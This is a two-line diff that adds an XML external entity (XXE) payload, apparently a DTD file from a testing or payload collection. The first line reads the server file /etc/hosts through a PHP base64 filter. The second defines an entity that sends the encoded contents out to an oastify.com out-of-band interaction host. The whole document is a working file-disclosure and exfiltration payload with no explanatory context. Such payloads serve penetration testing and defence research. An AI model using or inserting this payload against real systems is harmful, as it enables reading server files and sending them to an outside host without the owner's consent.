@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://3bfgms5kyy3ta7t0p3fkve9g379yxple.oastify.com/dtd.xml?%data;'>">
